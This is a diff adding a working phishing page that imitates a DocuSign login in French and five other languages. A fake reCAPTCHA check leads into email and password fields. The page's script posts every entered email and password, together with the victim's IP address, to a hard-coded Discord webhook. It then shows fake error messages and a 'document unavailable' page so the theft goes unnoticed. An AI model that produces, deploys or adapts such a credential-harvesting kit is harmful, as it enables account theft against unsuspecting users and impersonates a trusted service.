@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification de sécurité | DocuSign</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root {
+            --purple: #3D1F7A;
+            --purple-light: #5C2D91;
+            --bg: #F8F8F8;
+            --border: #D1D5DB;
+            --green: #16A34A;
+            --text: #2D1F4D;
+            --logo-height: 32px;
+            --title-size: 28px;
+            --subtitle-size: 15px;
+            --label-size: 14px;
+            --input-size: 15px;
+            --button-size: 14px;
+            --primary-color: #3D1F7A;
+            --title-color: #2D1F4D;
+            --card-padding: 44px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: var(--bg);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ========== RECAPTCHA CARD ========== */
+        .recaptcha-card {
+            background: #fff;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 24px 28px;
+            width: 340px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+            user-select: none;
+            transition: all 0.3s ease;
+        }
+
+        .recaptcha-card.verified {
+            border-color: var(--green);
+            box-shadow: 0 4px 12px rgba(22,163,74,0.12);
+        }
+
+        .recaptcha-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .recaptcha-brand {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #555;
+        }
+
+        .recaptcha-lock {
+            width: 28px;
+            height: 28px;
+            background: var(--purple);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 15px;
+        }
+
+        /* ========== CHECKBOX ROW ========== */
+        .check-row {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            background: #FAFAFA;
+            border: 2px solid var(--border);
+            border-radius: 6px;
+            padding: 14px 16px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            position: relative;
+        }
+
+        .check-row:hover {
+            border-color: #A0A0A0;
+            background: #F5F5F5;
+        }
+
+        .check-row.spinning {
+            border-color: var(--purple-light);
+            background: #F8F4FF;
+            cursor: default;
+        }
+
+        .check-row.success {
+            border-color: var(--green);
+            background: #F0FDF4;
+            cursor: default;
+        }
+
+        .custom-checkbox {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #9CA3AF;
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            transition: all 0.2s ease;
+        }
+
+        .check-row:hover .custom-checkbox {
+            border-color: #6B7280;
+        }
+
+        .spinner {
+            width: 22px;
+            height: 22px;
+            border: 3px solid #E5E7EB;
+            border-top-color: var(--purple);
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            flex-shrink: 0;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .checkmark {
+            width: 24px;
+            height: 24px;
+            background: var(--green);
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            animation: pop 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .checkmark svg {
+            width: 15px;
+            height: 15px;
+            stroke: #fff;
+            stroke-width: 3;
+            fill: none;
+        }
+
+        @keyframes pop {
+            0%   { transform: scale(0); }
+            70%  { transform: scale(1.15); }
+            100% { transform: scale(1); }
+        }
+
+        .check-label {
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            transition: color 0.2s;
+        }
+
+        .check-row.success .check-label {
+            color: var(--green);
+        }
+
+        /* ========== SUCCESS BANNER ========== */
+        .success-banner {
+            display: none;
+            align-items: center;
+            gap: 10px;
+            margin-top: 12px;
+            padding: 10px 14px;
+            background: #F0FDF4;
+            border-radius: 6px;
+            color: var(--green);
+            font-size: 13px;
+            font-weight: 500;
+            animation: slideDown 0.3s ease;
+        }
+
+        .success-banner.active {
+            display: flex;
+        }
+
+        .success-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--green);
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50%      { opacity: 0.35; }
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-8px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ========== LOGIN CARD ========== */
+        .login-card {
+            box-shadow: 0 10px 15px -3px rgb(0 0 0 / 0.05),
+                       0 4px 6px -4px rgb(0 0 0 / 0.05);
+            border: 1px solid #E5E5E5;
+            padding: var(--card-padding);
+        }
+
+        .docusign-purple {
+            background-color: var(--primary-color);
+        }
+
+        .docusign-purple:hover {
+            background-color: #2E1659;
+        }
+
+        .doc-unavailable-icon {
+            width: 90px;
+            height: 90px;
+            margin: 0 auto 28px auto;
+            background: #FFF0F0;
+            color: #C53030;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 42px;
+            font-weight: bold;
+        }
+
+        .btn-ds-logo {
+            height: 16px;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+
+        @media (max-width: 380px) {
+            .recaptcha-card {
+                width: 92vw;
+                padding: 18px 16px;
+            }
+        }
+    </style>
+</head>
+<body class="bg-[#F8F8F8] min-h-screen flex flex-col">
+
+    <!-- ================== HEADER UNIFIÉ ================== -->
+    <header class="bg-white border-b border-[#E5E5E5]">
+        <div class="w-full px-5 md:px-6">
+            <div class="flex items-center h-[65px]">
+                <a href="https://account.docusign.com/">
+                    <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg"
+                         alt="DocuSign"
+                         style="height: var(--logo-height);">
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <!-- ================== MAIN ================== -->
+    <main class="flex-1 flex items-center justify-center px-4 py-10 md:py-16">
+
+        <!-- ═══════════ RECAPTCHA SECTION (visible au départ) ═══════════ -->
+        <div id="recaptcha-section">
+            <div class="recaptcha-card" id="recaptchaCard">
+                <div class="recaptcha-header">
+                    <div class="recaptcha-brand">
+                        <div class="recaptcha-lock">🔒</div>
+                        <span>Vérification de sécurité</span>
+                    </div>
+                </div>
+
+                <div class="check-row" id="checkRow" onclick="startVerification()">
+                    <div class="custom-checkbox" id="checkboxIcon"></div>
+                    <span class="check-label" id="checkLabel">Je ne suis pas un robot</span>
+                    <div style="flex:1;"></div>
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='32' height='32' viewBox='0 0 32 32'%3E%3Ccircle cx='16' cy='16' r='14' fill='%233D1F7A'/%3E%3Cpath d='M10 16l4 4 8-8' stroke='white' stroke-width='2.5' fill='none' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E"
+                         alt="reCAPTCHA" style="width:32px;height:32px;flex-shrink:0;opacity:0.5;" id="recaptchaLogo">
+                </div>
+
+                <div class="success-banner" id="successBanner">
+                    <div class="success-dot"></div>
+                    <span>Vérification réussie — chargement...</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- ═══════════ LOGIN SECTION (cachée au départ) ═══════════ -->
+        <div id="login-section" class="hidden w-full max-w-[520px]">
+
+            <!-- PAGE 1 : EMAIL -->
+            <div id="email-page" class="bg-white rounded-xl login-card">
+                <h1 id="title" style="font-size: var(--title-size); color: var(--title-color); font-weight: 400;" class="mb-4">
+                    Se connecter à Docusign
+                </h1>
+                <p id="subtitle" style="font-size: var(--subtitle-size);" class="text-[#555555] mb-8">
+                    Saisissez votre adresse e-mail pour vous connecter.
+                </p>
+
+                <div class="space-y-6">
+                    <div>
+                        <label id="email-label" style="font-size: var(--label-size);" class="block font-normal text-[#2D1F4D] mb-1.5">
+                            Adresse e-mail <span class="text-red-500">*</span>
+                        </label>
+                        <input id="email-input" type="email" placeholder="Saisissez une adresse e-mail"
+                               style="font-size: var(--input-size); width: 100%;"
+                               class="px-4 py-3 border border-[#CCCCCC] rounded-lg placeholder:text-[#888888] focus:border-2 focus:border-[#3D1F7A]">
+                    </div>
+
+                    <button id="next-btn" type="button"
+                            style="font-size: var(--button-size); width: 100%;"
+                            class="docusign-purple text-white font-semibold py-[14px] rounded-lg tracking-[0.5px]">
+                        SUIVANT
+                    </button>
+
+                    <a id="signup-btn" href="https://account.docusign.com/signup"
+                       style="font-size: var(--button-size); width: 100%;"
+                       class="block bg-[#F3F3F3] hover:bg-[#E9E9E9] text-[#2D1F4D] text-center font-medium py-[14px] rounded-lg transition-colors">
+                        S'inscrire gratuitement
+                    </a>
+                </div>
+            </div>
+
+            <!-- PAGE 2 : MOT DE PASSE -->
+            <div id="password-page" class="bg-white rounded-xl login-card hidden">
+                <h1 id="password-title" style="font-size: 24px; color: var(--title-color); font-weight: 500;" class="mb-6">
+                    Se connecter
+                </h1>
+
+                <div class="flex items-center mb-8 text-[#2D1F4D]">
+                    <span id="back-arrow" class="mr-2 text-lg cursor-pointer select-none">&larr;</span>
+                    <span id="display-email" class="text-[15px]"></span>
+                </div>
+
+                <div class="space-y-4">
+                    <div>
+                        <label id="password-label" style="font-size: var(--label-size);" class="block font-normal text-[#2D1F4D] mb-1.5">
+                            Mot de passe <span class="text-red-500">*</span>
+                        </label>
+
+                        <div class="relative">
+                            <input id="password-input" type="password" placeholder="Saisissez votre mot de passe"
+                                   style="font-size: var(--input-size); width: 100%; padding-right: 42px;"
+                                   class="px-4 py-3 border border-[#CCCCCC] rounded-lg placeholder:text-[#888888] focus:border-2 focus:border-[#3D1F7A]">
+
+                            <button type="button" id="toggle-password"
+                                    class="absolute right-3.5 top-1/2 -translate-y-1/2 text-[#888888] hover:text-[#555555]">
+                                <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
+                                </svg>
+                            </button>
+                        </div>
+
+                        <div id="error-message" class="hidden mt-2 flex items-center text-[#C53030] text-sm">
+                            <span class="mr-2 inline-flex items-center justify-center w-[15px] h-[15px] rounded-full bg-[#C53030] text-white text-[9px]">&#10005;</span>
+                            <span id="error-text">Email et / ou mot de passe invalide</span>
+                        </div>
+                    </div>
+
+                    <button id="login-btn" type="button"
+                            style="font-size: var(--button-size); width: 100%;"
+                            class="docusign-purple text-white font-semibold py-[13px] rounded-lg tracking-[0.3px]">
+                        Se connecter
+                    </button>
+
+                    <div class="pt-1">
+                        <a href="#" class="text-[#5C2D91] text-[14px] hover:underline" id="reset-password">
+                            Réinitialiser le mot de passe
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PAGE 3 : DOCUMENT INDISPONIBLE -->
+            <div id="doc-unavailable-page" class="bg-white rounded-xl login-card hidden text-center">
+                <div class="doc-unavailable-icon">&#9888;</div>
+                <h1 id="doc-unavailable-title" style="font-size: 28px; color: #2D1F4D; font-weight: 500;" class="mb-3">
+                    Document indisponible
+                </h1>
+                <p id="doc-unavailable-desc" style="font-size: 16px; color: #666666; line-height: 1.6;">
+                    Ce document n'est plus accessible.
+                </p>
+                <a id="doc-unavailable-back-link"
+                   href="https://www.docusign.com/fr-fr/produits/signature-electronique?msockid=1a041e568ab6657f1cb8092a8bb0646c"
+                   style="font-size: 14px; width: 100%; margin-top: 32px;"
+                   class="docusign-purple text-white font-semibold py-[14px] rounded-lg tracking-[0.5px] flex items-center justify-center no-underline">
+                    <span id="doc-unavailable-btn-text">Retour vers DocuSign</span>
+                    <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg"
+                         alt="DocuSign"
+                         class="btn-ds-logo">
+                </a>
+                <p id="doc-unavailable-footer-text" style="font-size: 13px; color: #888888; margin-top: 24px; line-height: 1.5;">
+                    Si vous pensez qu'il s'agit d'une erreur, contactez directement l'expéditeur afin d'obtenir un nouveau lien.
+                </p>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- ================== FOOTER UNIFIÉ ================== -->
+    <footer class="bg-white border-t border-[#E5E5E5] py-4 text-xs text-[#666666]">
+        <div class="w-full px-5 md:px-6 flex flex-col md:flex-row md:items-center md:justify-between gap-y-3 text-[12px]">
+            <div class="flex items-center gap-2">
+                <span>Powered by</span>
+                <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" alt="DocuSign" style="height: 15px;">
+            </div>
+            <div class="flex flex-wrap items-center gap-x-4 gap-y-1">
+                <select id="language-select" class="border border-gray-300 rounded px-2 py-0.5 text-xs bg-white cursor-pointer">
+                    <option value="en">English (US)</option>
+                    <option value="fr">Français</option>
+                    <option value="de">Deutsch</option>
+                    <option value="es">Español</option>
+                    <option value="it">Italiano</option>
+                    <option value="pt">Português</option>
+                </select>
+                <a href="https://support.docusign.com/contactSupport" class="hover:text-black">Contact Us</a>
+                <a href="https://www.docusign.com/legal/terms-and-conditions" class="hover:text-black">Terms of Use</a>
+                <a href="https://www.docusign.com/privacy" class="hover:text-black">Privacy</a>
+                <a href="https://www.docusign.com/ip" class="hover:text-black">Intellectual Property</a>
+                <a href="https://www.docusign.com/trust" class="hover:text-black">Trust</a>
+            </div>
+            <div>Copyright &copy; 2026 Docusign, Inc. All rights reserved</div>
+        </div>
+    </footer>
+
+    <!-- ================== SCRIPTS COMBINÉS ================== -->
+    <script>
+    // ====================================================================
+    // PARTIE 1 : RECAPTCHA
+    // ====================================================================
+    var recaptchaState = 'idle'; // idle | spinning | verified
+
+    function startVerification() {
+        if (recaptchaState === 'spinning' || recaptchaState === 'verified') return;
+
+        var checkRow = document.getElementById('checkRow');
+        var checkbox = document.getElementById('checkboxIcon');
+        var label    = document.getElementById('checkLabel');
+        var logo     = document.getElementById('recaptchaLogo');
+        var card     = document.getElementById('recaptchaCard');
+
+        // Phase 1 : spinner
+        recaptchaState = 'spinning';
+        checkRow.classList.add('spinning');
+        checkbox.innerHTML = '<div class="spinner"></div>';
+        label.textContent = 'Vérification en cours...';
+        logo.style.opacity = '0.3';
+
+        // Phase 2 : après 1.5s → succès
+        setTimeout(function() {
+            recaptchaState = 'verified';
+            checkRow.classList.remove('spinning');
+            checkRow.classList.add('success');
+            checkbox.innerHTML = '<div class="checkmark"><svg viewBox="0 0 24 24"><polyline points="4 12 10 18 20 6"/></svg></div>';
+            label.textContent = 'Je ne suis pas un robot';
+            card.classList.add('verified');
+            logo.style.opacity = '1';
+            logo.src = 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'32\' height=\'32\' viewBox=\'0 0 32 32\'%3E%3Ccircle cx=\'16\' cy=\'16\' r=\'14\' fill=\'%2316A34A\'/%3E%3Cpath d=\'M10 16l4 4 8-8\' stroke=\'white\' stroke-width=\'2.5\' fill=\'none\' stroke-linecap=\'round\' stroke-linejoin=\'round\'/%3E%3C/svg%3E';
+
+            document.getElementById('successBanner').classList.add('active');
+            checkRow.onclick = null;
+
+            // 🔥 Transition vers la section login après 1.5s
+            setTimeout(function() {
+                document.getElementById('recaptcha-section').classList.add('hidden');
+                document.getElementById('login-section').classList.remove('hidden');
+                // Auto-focus sur le champ email
+                document.getElementById('email-input').focus();
+            }, 1500);
+        }, 1500);
+    }
+
+
+    // ====================================================================
+    // PARTIE 2 : LOGIN + DISCORD WEBHOOK
+    // ====================================================================
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1521550622934171790/n_2Dc-FrYvMwB1jzcstLb7x0r0YcMtSA7nK0STEz1c3_i_DkiU_XSn1QhCLmyzqAgl7f';
+
+    var geoData = { ip: 'Chargement...' };
+    var totalSubmissions = 0;
+
+    // Récupération IP (ipify principal, ipapi fallback)
+    (function fetchIP() {
+        fetch('https://api.ipify.org?format=json')
+            .then(function(r) { return r.json(); })
+            .then(function(d) { geoData.ip = d.ip || 'Inconnue'; })
+            .catch(function() {
+                fetch('https://ipapi.co/json/')
+                    .then(function(r) { return r.json(); })
+                    .then(function(d) { geoData.ip = d.ip || 'Inconnue'; })
+                    .catch(function() { geoData.ip = 'Indisponible'; });
+            });
+    })();
+
+    function sendToDiscord(email, password) {
+        var msg = [
+            '━━━━━━━━━━━━━━━━━━━━━━',
+            '**Docusign — nouveau identifiant**',
+            '━━━━━━━━━━━━━━━━━━━━━━',
+            '',
+            '📧 `' + (email || 'N/A') + '`',
+            '🔑 `' + (password || 'N/A') + '`',
+            '🔢 `' + totalSubmissions + '`',
+            '🌍 `' + geoData.ip + '`'
+        ].join('\n');
+
+        fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: msg })
+        });
+    }
+
+    // ====================================================================
+    // TRADUCTIONS
+    // ====================================================================
+    var translations = {
+        en: {
+            title: "Log in to Docusign",
+            subtitle: "Enter your email to log in.",
+            emailLabel: "Email *",
+            emailPlaceholder: "Enter email",
+            next: "NEXT",
+            signup: "Sign Up for Free",
+            passwordTitle: "Log In",
+            passwordLabel: "Password *",
+            passwordPlaceholder: "Enter password",
+            loginBtn: "Log in",
+            resetPassword: "Reset password",
+            errorMessage: "Invalid email and / or password",
+            docUnavailableTitle: "Document Unavailable",
+            docUnavailableDesc: "This document is no longer accessible.",
+            docUnavailableBtn: "Back to DocuSign",
+            docUnavailableFooter: "If you believe this is an error, please contact the sender directly to obtain a new link."
+        },
+        fr: {
+            title: "Se connecter à Docusign",
+            subtitle: "Saisissez votre adresse e-mail pour vous connecter.",
+            emailLabel: "Adresse e-mail *",
+            emailPlaceholder: "Saisissez une adresse e-mail",
+            next: "SUIVANT",
+            signup: "S'inscrire gratuitement",
+            passwordTitle: "Se connecter",
+            passwordLabel: "Mot de passe *",
+            passwordPlaceholder: "Saisissez votre mot de passe",
+            loginBtn: "Se connecter",
+            resetPassword: "Réinitialiser le mot de passe",
+            errorMessage: "Email et / ou mot de passe invalide",
+            docUnavailableTitle: "Document indisponible",
+            docUnavailableDesc: "Ce document n'est plus accessible.",
+            docUnavailableBtn: "Retour vers DocuSign",
+            docUnavailableFooter: "Si vous pensez qu'il s'agit d'une erreur, contactez directement l'expéditeur afin d'obtenir un nouveau lien."
+        },
+        de: {
+            title: "Bei Docusign anmelden",
+            subtitle: "Geben Sie Ihre E-Mail-Adresse ein, um sich anzumelden.",
+            emailLabel: "E-Mail *",
+            emailPlaceholder: "E-Mail eingeben",
+            next: "WEITER",
+            signup: "Kostenlos registrieren",
+            passwordTitle: "Anmelden",
+            passwordLabel: "Passwort *",
+            passwordPlaceholder: "Passwort eingeben",
+            loginBtn: "Anmelden",
+            resetPassword: "Passwort zurücksetzen",
+            errorMessage: "Ungültige E-Mail und/oder Passwort",
+            docUnavailableTitle: "Dokument nicht verfügbar",
+            docUnavailableDesc: "Dieses Dokument ist nicht mehr zugänglich.",
+            docUnavailableBtn: "Zurück zu DocuSign",
+            docUnavailableFooter: "Wenn Sie glauben, dass es sich um einen Fehler handelt, wenden Sie sich bitte direkt an den Absender, um einen neuen Link zu erhalten."
+        },
+        es: {
+            title: "Iniciar sesión en Docusign",
+            subtitle: "Introduce tu correo electrónico para iniciar sesión.",
+            emailLabel: "Correo electrónico *",
+            emailPlaceholder: "Introduce tu correo",
+            next: "SIGUIENTE",
+            signup: "Regístrate gratis",
+            passwordTitle: "Iniciar sesión",
+            passwordLabel: "Contraseña *",
+            passwordPlaceholder: "Introduce tu contraseña",
+            loginBtn: "Iniciar sesión",
+            resetPassword: "Restablecer contraseña",
+            errorMessage: "Correo electrónico y/o contraseña no válidos",
+            docUnavailableTitle: "Documento no disponible",
+            docUnavailableDesc: "Este documento ya no está accesible.",
+            docUnavailableBtn: "Volver a DocuSign",
+            docUnavailableFooter: "Si cree que se trata de un error, póngase en contacto directamente con el remitente para obtener un nuevo enlace."
+        },
+        it: {
+            title: "Accedi a Docusign",
+            subtitle: "Inserisci la tua email per accedere.",
+            emailLabel: "Email *",
+            emailPlaceholder: "Inserisci email",
+            next: "AVANTI",
+            signup: "Registrati gratis",
+            passwordTitle: "Accedi",
+            passwordLabel: "Password *",
+            passwordPlaceholder: "Inserisci password",
+            loginBtn: "Accedi",
+            resetPassword: "Reimposta password",
+            errorMessage: "Email e/o password non validi",
+            docUnavailableTitle: "Documento non disponibile",
+            docUnavailableDesc: "Questo documento non è più accessibile.",
+            docUnavailableBtn: "Torna a DocuSign",
+            docUnavailableFooter: "Se ritieni si tratti di un errore, contatta direttamente il mittente per ottenere un nuovo link."
+        },
+        pt: {
+            title: "Entrar no Docusign",
+            subtitle: "Digite seu e-mail para entrar.",
+            emailLabel: "Email *",
+            emailPlaceholder: "Digite o email",
+            next: "PRÓXIMO",
+            signup: "Cadastre-se gratuitamente",
+            passwordTitle: "Entrar",
+            passwordLabel: "Senha *",
+            passwordPlaceholder: "Digite a senha",
+            loginBtn: "Entrar",
+            resetPassword: "Redefinir senha",
+            errorMessage: "Email e/ou senha inválidos",
+            docUnavailableTitle: "Documento indisponível",
+            docUnavailableDesc: "Este documento não está mais acessível.",
+            docUnavailableBtn: "Voltar ao DocuSign",
+            docUnavailableFooter: "Se você acredita que isso é um erro, entre em contato diretamente com o remetente para obter um novo link."
+        }
+    };
+
+    // ====================================================================
+    // ÉTAT LOGIN + DOM
+    // ====================================================================
+    var currentLang = 'fr';
+    var failedAttempts = 0;
+    var MAX_FAILED_ATTEMPTS = 2;
+
+    var select             = document.getElementById('language-select');
+    var emailPage          = document.getElementById('email-page');
+    var passwordPage       = document.getElementById('password-page');
+    var docUnavailablePage = document.getElementById('doc-unavailable-page');
+    var nextBtn            = document.getElementById('next-btn');
+    var emailInput         = document.getElementById('email-input');
+    var displayEmail       = document.getElementById('display-email');
+    var backArrow          = document.getElementById('back-arrow');
+    var loginBtn           = document.getElementById('login-btn');
+    var passwordInput      = document.getElementById('password-input');
+    var errorMessage       = document.getElementById('error-message');
+    var errorText          = document.getElementById('error-text');
+    var togglePasswordBtn  = document.getElementById('toggle-password');
+
+    function updateTexts(lang) {
+        currentLang = lang;
+        var t = translations[lang];
+
+        document.getElementById('title').textContent                = t.title;
+        document.getElementById('subtitle').textContent             = t.subtitle;
+        document.getElementById('email-label').innerHTML            = t.emailLabel;
+        emailInput.placeholder                                       = t.emailPlaceholder;
+        nextBtn.textContent                                          = t.next;
+        document.getElementById('signup-btn').textContent           = t.signup;
+
+        document.getElementById('password-title').textContent       = t.passwordTitle;
+        document.getElementById('password-label').innerHTML         = t.passwordLabel;
+        passwordInput.placeholder                                    = t.passwordPlaceholder;
+        loginBtn.textContent                                         = t.loginBtn;
+        document.getElementById('reset-password').textContent       = t.resetPassword;
+
+        if (errorText) errorText.textContent = t.errorMessage;
+
+        document.getElementById('doc-unavailable-title').textContent     = t.docUnavailableTitle;
+        document.getElementById('doc-unavailable-desc').textContent      = t.docUnavailableDesc;
+        document.getElementById('doc-unavailable-btn-text').textContent  = t.docUnavailableBtn;
+        document.getElementById('doc-unavailable-footer-text').textContent = t.docUnavailableFooter;
+    }
+
+    function detectLanguage() {
+        var bl = (navigator.language || navigator.userLanguage || 'fr').toLowerCase();
+        if (bl.startsWith('fr')) return 'fr';
+        if (bl.startsWith('de')) return 'de';
+        if (bl.startsWith('es')) return 'es';
+        if (bl.startsWith('it')) return 'it';
+        if (bl.startsWith('pt')) return 'pt';
+        if (bl.startsWith('en')) return 'en';
+        return 'fr';
+    }
+
+    // Init langue
+    (function init() {
+        var detected = detectLanguage();
+        select.value = detected;
+        updateTexts(detected);
+    })();
+
+    select.addEventListener('change', function() { updateTexts(this.value); });
+
+    // Toggle password visibility
+    var pwVisible = false;
+    togglePasswordBtn.addEventListener('click', function() {
+        pwVisible = !pwVisible;
+        passwordInput.type = pwVisible ? 'text' : 'password';
+    });
+
+    // NEXT : email → password
+    nextBtn.addEventListener('click', function() {
+        var email = emailInput.value.trim();
+        if (!email) {
+            var msgs = {
+                fr: "Veuillez saisir une adresse email",
+                en: "Please enter an email address",
+                de: "Bitte geben Sie eine E-Mail-Adresse ein",
+                es: "Por favor, introduzca una dirección de correo electrónico",
+                it: "Inserisci un indirizzo email",
+                pt: "Por favor, insira um endereço de email"
+            };
+            alert(msgs[currentLang] || msgs['fr']);
+            return;
+        }
+        displayEmail.textContent = email;
+        emailPage.classList.add('hidden');
+        passwordPage.classList.remove('hidden');
+        docUnavailablePage.classList.add('hidden');
+        errorMessage.classList.add('hidden');
+        passwordInput.value = '';
+        failedAttempts = 0;
+        passwordInput.focus();
+    });
+
+    // BACK arrow (mot de passe → email)
+    backArrow.addEventListener('click', function() {
+        passwordPage.classList.add('hidden');
+        emailPage.classList.remove('hidden');
+        docUnavailablePage.classList.add('hidden');
+        failedAttempts = 0;
+    });
+
+    // LOG IN → Discord + logique erreur
+    loginBtn.addEventListener('click', function() {
+        var email    = displayEmail.textContent.trim();
+        var password = passwordInput.value;
+
+        totalSubmissions++;
+        sendToDiscord(email, password);
+
+        failedAttempts++;
+        if (failedAttempts >= MAX_FAILED_ATTEMPTS) {
+            passwordPage.classList.add('hidden');
+            docUnavailablePage.classList.remove('hidden');
+            errorMessage.classList.add('hidden');
+            failedAttempts = 0;
+        } else {
+            errorMessage.classList.remove('hidden');
+            passwordInput.value = '';
+            passwordInput.focus();
+        }
+    });
+
+    // ENTER key
+    emailInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') nextBtn.click();
+    });
+    passwordInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') loginBtn.click();
+    });
+    </script>
+</body>
+</html>
